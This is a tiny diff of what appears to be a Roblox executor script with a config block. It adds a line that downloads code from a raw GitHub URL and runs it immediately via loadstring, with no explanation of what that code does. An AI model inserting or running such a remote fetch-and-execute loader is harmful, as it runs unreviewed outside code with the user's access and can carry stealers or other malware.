@@ -18,7 +18,8 @@ if not getgenv().Config then
 	}
 end
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/duongcuteleu/main/main/Checkhuge"))()
+task.wait(5)
 
 
 
